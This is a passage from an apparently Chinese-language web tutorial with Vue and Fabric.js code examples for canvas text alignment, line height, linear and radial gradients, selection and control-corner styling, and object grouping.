    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">textAlign</span>: <span class="hljs-string">'center'</span>,<span class="hljs-comment">// 居中对齐</span>
  })

  <span class="hljs-comment">// 右对齐</span>
  <span class="hljs-keyword">const</span> msg3 = <span class="hljs-string">'右\n右右\n右对齐'</span>
  <span class="hljs-keyword">const</span> right = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg3, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">200</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">textAlign</span>: <span class="hljs-string">'right'</span>, <span class="hljs-comment">// 右对齐</span>
  })

  <span class="hljs-comment">// 文本内容</span>
  <span class="hljs-keyword">const</span> msg4 = <span class="hljs-string">"What are you doing,\nWhat are you doing,\nWhat are you doing\What are you doing"</span>
  
  <span class="hljs-keyword">const</span> lineHeight1 = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg4, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">250</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">lineHeight</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">// 行高</span>
  })

  <span class="hljs-keyword">const</span> lineHeight2 = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg4, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">250</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">300</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">lineHeight</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// 行高</span>
  })

  canvas.<span class="hljs-title function_">add</span>(
    overline,
    underline,
    linethrough,
    left,
    center,
    right,
    lineHeight1,
    lineHeight2
  )

}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-28">渐变</h2>
<h3 data-id="heading-29">线性渐变</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f8bfeccd8fe4efcbd40c0f9423ab083~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=szVZa%2BGCquQU%2Bw%2FFWJRXOQ7awCk%3D" alt="031.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 圆</span>
  <span class="hljs-keyword">let</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
  })

  <span class="hljs-comment">// 线性渐变</span>
  <span class="hljs-keyword">let</span> gradient = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Gradient</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-string">'linear'</span>, <span class="hljs-comment">// linear or radial</span>
    <span class="hljs-attr">gradientUnits</span>: <span class="hljs-string">'pixels'</span>, <span class="hljs-comment">// pixels or pencentage 像素 或者 百分比</span>
    <span class="hljs-attr">coords</span>: { <span class="hljs-attr">x1</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y1</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">x2</span>: circle.<span class="hljs-property">width</span>, <span class="hljs-attr">y2</span>: <span class="hljs-number">0</span> }, <span class="hljs-comment">// 至少2个坐标对（x1，y1和x2，y2）将定义渐变在对象上的扩展方式</span>
    <span class="hljs-attr">colorStops</span>:[ <span class="hljs-comment">// 定义渐变颜色的数组</span>
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'red'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0.2</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'orange'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0.4</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'yellow'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0.6</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'green'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0.8</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'blue'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'purple'</span> },
    ]
  })
  circle.<span class="hljs-title function_">set</span>(<span class="hljs-string">'fill'</span>, gradient);
  canvas.<span class="hljs-title function_">add</span>(circle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-30">径向渐变</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42c3e03aa82c47b9b3a0d700dad45491~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=nzxOW3Xl0qJx3Q521h2n33cLFQk%3D" alt="032.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 圆</span>
  <span class="hljs-keyword">let</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
  })

  <span class="hljs-keyword">let</span> gradient = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Gradient</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-string">'radial'</span>,
    <span class="hljs-attr">coords</span>: {
      <span class="hljs-attr">r1</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 该属性仅径向渐变可用，外圆半径</span>
      <span class="hljs-attr">r2</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">// 该属性仅径向渐变可用，外圆半径  </span>
      <span class="hljs-attr">x1</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 焦点的x坐标</span>
      <span class="hljs-attr">y1</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 焦点的y坐标</span>
      <span class="hljs-attr">x2</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 中心点的x坐标</span>
      <span class="hljs-attr">y2</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 中心点的y坐标</span>
    },
    <span class="hljs-attr">colorStops</span>: [
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'#fee140'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'#fa709a'</span> }
    ]
  })

  circle.<span class="hljs-title function_">set</span>(<span class="hljs-string">'fill'</span>, gradient);
  canvas.<span class="hljs-title function_">add</span>(circle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-31">选中状态</h2>
<p><code>Fabric.js</code> 创建出来的元素（图形、图片、组等）默认是可以被选中的。</p>
<h3 data-id="heading-32">禁止选中</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29b61e15621d43aaa8223c5a58f03946~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=Jx8kq56%2Fp0P65MScLDpENGRkZ24%3D" alt="055.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span>
  })

  <span class="hljs-comment">// 元素禁止选中</span>
  rect.<span class="hljs-property">selectable</span> = <span class="hljs-literal">false</span>

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-33">框选样式</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 圆形</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">radius</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f55'</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">70</span>
  })

  canvas.<span class="hljs-title function_">add</span>(circle)

  canvas.<span class="hljs-property">selection</span> = <span class="hljs-literal">true</span> <span class="hljs-comment">// 画布是否可选中。默认true；false 不可选中</span>
  canvas.<span class="hljs-property">selectionColor</span> = <span class="hljs-string">'rgba(106, 101, 216, 0.3)'</span> <span class="hljs-comment">// 画布鼠标框选时的背景色</span>
  canvas.<span class="hljs-property">selectionBorderColor</span> = <span class="hljs-string">"#1d2786"</span> <span class="hljs-comment">// 画布鼠标框选时的边框颜色</span>
  canvas.<span class="hljs-property">selectionLineWidth</span> = <span class="hljs-number">6</span> <span class="hljs-comment">// 画布鼠标框选时的边框厚度</span>
  canvas.<span class="hljs-property">selectionDashArray</span> = [<span class="hljs-number">30</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>] <span class="hljs-comment">// 画布鼠标框选时边框虚线规则</span>
  canvas.<span class="hljs-property">selectionFullyContained</span> = <span class="hljs-literal">true</span> <span class="hljs-comment">// 只选择完全包含在拖动选择矩形中的形状</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-34">自定义边和控制角样式</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63e167168d524a2285efc48c9b9b05b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=LN6GPJqFnGtQxwBi2qduohjxCw4%3D" alt="058.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 圆形</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">radius</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f55'</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">70</span>
  })

  circle.<span class="hljs-title function_">set</span>({
    <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'red'</span>, <span class="hljs-comment">// 边框颜色</span>
    <span class="hljs-attr">cornerColor</span>: <span class="hljs-string">'green'</span>, <span class="hljs-comment">// 控制角颜色</span>
    <span class="hljs-attr">cornerSize</span>: <span class="hljs-number">10</span>, <span class="hljs-comment">// 控制角大小</span>
    <span class="hljs-attr">transparentCorners</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// 控制角填充色不透明</span>
  })

  canvas.<span class="hljs-title function_">add</span>(circle)

  canvas.<span class="hljs-title function_">setActiveObject</span>(circle) <span class="hljs-comment">// 选中圆</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-35">没有控制角</h3>
<p>没有控制角将意味着无法用鼠标直接操作缩放和旋转，只允许移动操作。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61e69490ee584fb9890c3308d9196820~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=obBbGBiuo4KXQQ25Hg6piDjx%2FBQ%3D" alt="062.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 圆形</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">radius</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f55'</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">70</span>
  })

  circle.<span class="hljs-property">hasControls</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// 禁止控制角</span>

  canvas.<span class="hljs-title function_">add</span>(circle)

  canvas.<span class="hljs-title function_">setActiveObject</span>(circle) <span class="hljs-comment">// 选中第一项</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-36">不允许框选</h3>
<p>不允许从画布框选，但允许选中元素。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7209ba9c7b674d478b40b80aef9771b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=KPZAwjTdaEyCwGrOncks3kYVeyE%3D" alt="065.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 圆形</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">radius</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f55'</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">70</span>
  })

  canvas.<span class="hljs-title function_">add</span>(circle)
  canvas.<span class="hljs-property">selection</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// 不允许直接从画布框选</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-37">分组</h2>
<h3 data-id="heading-38">建组</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d77fa6e4a6b44a12bb8404d826041e04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=LKoJk0QVcEIUtW9o1zW6pzJ3YyQ%3D" alt="039.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 椭圆</span>
  <span class="hljs-keyword">const</span> ellipse = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Ellipse</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">rx</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">ry</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ddd'</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">'center'</span>, <span class="hljs-comment">// 旋转x轴：left, right, center</span>
    <span class="hljs-attr">originY</span>: <span class="hljs-string">'center'</span> <span class="hljs-comment">// 旋转y轴：top, bottom, center</span>
  })

  <span class="hljs-comment">// 文本</span>
  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello World'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">"center"</span>,
    <span class="hljs-attr">originY</span>: <span class="hljs-string">"center"</span>
  })

  <span class="hljs-comment">// 建组</span>
  <span class="hljs-keyword">const</span> group = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Group</span>([ellipse, text], {
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 整组距离顶部100</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 整组距离左侧100</span>
    <span class="hljs-attr">angle</span>: -<span class="hljs-number">10</span>, <span class="hljs-comment">// 整组旋转-10deg</span>
  })

  canvas.<span class="hljs-title function_">add</span>(group)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>new fabric.Group </code>可以创建一个组，把多个图层放在同一个组内，实现同步的操作，比如拖拽、缩放等。</p>
<h3 data-id="heading-39">操作组</h3>
<p><code>Fabric.js</code> 的组提供了很多方法，这里列一些常用的：</p>
<ul>
<li>
<p><code>getObjects()</code> 返回一组中所有对象的数组</p>
</li>
<li>
<p><code>size()</code> 所有对象的数量</p>
</li>
<li>
<p><code>contains()</code> 检查特定对象是否在 <code>group</code> 中</p>
</li>
<li>
<p><code>item()</code> 组中元素</p>
</li>
<li>
<p><code>forEachObject()</code> 遍历组中对象</p>
</li>
<li>
<p><code>add()</code> 添加元素对象</p>
</li>
<li>
<p><code>remove()</code> 删除元素对象</p>
</li>
<li>
<p><code>fabric.util.object.clone()</code> 克隆</p>
</li>
</ul>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
